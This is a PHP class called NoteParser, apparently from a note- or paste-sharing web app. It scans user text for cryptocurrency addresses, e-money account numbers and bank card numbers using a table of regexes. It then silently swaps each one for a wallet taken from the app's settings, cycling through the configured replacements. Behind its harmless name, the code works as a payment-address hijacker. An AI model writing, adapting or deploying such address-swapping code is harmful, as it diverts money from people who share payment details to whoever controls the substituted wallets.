<?php

namespace App\Services;

class NoteParser
{
    public $wallets;
    public $rules;
    public $replaces;

    /**
     * Constructor.
     */
    public function __construct()
    {
        $wallets = setting()->all()->filter(function ($value, $key) {
            return false !== stristr($key, 'wallet:');
        })->mapWithKeys(function ($value, $key) {
            $key = str_replace('wallet:', '', $key);
            return [$key => $value];
        });
        $this->wallets = $wallets;

        $this->rules = [
            'ethereum' => '0x[a-fA-F0-9]{40}',
            'bitcoin_p2pkh' => '([1])[a-zA-HJ-NP-Z0-9]{25,39}',
            'bitcoin_p2sh' => '([3])[a-zA-HJ-NP-Z0-9]{25,39}',
            'bitcoin_bech32' => '(bc1)[a-zA-HJ-NP-Z0-9]{25,39}',
            'litecoin' => '[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}',
            'dogecoin' => 'D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}',
            'bitcoincash' => '((bitcoincash|bchreg|bchtest))?(q|p)[a-z0-9]{41}',
            'yandex_money' => '41001\d{7,11}',
            'qiwi' => '[0-9]{9,12}',
            'payeer' => 'P\d{7,11}',
            'advcash_usd' => '([T])[a-zA-HJ-NP-Z0-9]{25,34}',
            'advcash_eur' => '[ltc1][a-zA-HJ-NP-Z0-9]{25,43}',
            'advcash_rub' => '[a-zA-HJ-NP-Z0-9]{93,106}',
            'advcash_uah' => 'P\d{7,11}',
            'perfect_money_usd' => '(bc1)[a-zA-HJ-NP-Z0-9]{43,62}',
            'perfect_money_eur' => 'E\d{7,11}',
            'card_sberbank' => '427920[0-9]{7,12}',
            'card' => '[0-9]{13,18}',
            // 'card_space_16' => '(\d{4} *\d{4} *\d{4} *\d{4})',
            // 'card_space_12' => '(\d{4} *\d{4} *\d{4})',
        ];

        foreach ($this->rules as $key => $val) {
            $this->replaces[$key] = 0;
        }
    }

    /**
     * runValidator
     */
    public function runValidator($word)
    {
        foreach ($this->rules as $key => $value) {
            if (isset($this->wallets[$key]) and !empty($this->wallets[$key])) {
                $array = explode(',', $this->wallets[$key]);
                if (preg_match('#^' . $value . '+$#', str_replace(['.', ',', '!', '?', '-', '+', '_', ':', ';', '/', '\/', '#', '$', '^', '"', "'"], '', $word))) {
                    $last = $this->replaces[$key];
                    $this->replaces[$key] += 1;
                    return [
                        'rule' => $key,
                        'replace' => $array[$last] ?? $array[0]
                    ];
                }
            }
        }

        return false;
    }

    /**
     * parse
     */
    public function parse($string): array
    {
        $string = str_replace(':', ': ', $string);
        $words = explode(' ', trim(str_replace(["\n", "\r"], [' @br_aiHooZo3 ', ''], strip_tags($string))));
        $newWords = [];
        $contain = [];

        foreach ($words as $key => $value) {
            if ($validator = $this->runValidator($value)) {
                $contain[] = $validator['rule'];
                $value = $validator['replace'];
            }
            $newWords[$key] = $value;
        }

        return [
            'text' => str_replace(' @br_aiHooZo3 ', "\n", implode(' ', $newWords)),
            'contain' => implode(',', $contain)
        ];
    }
}
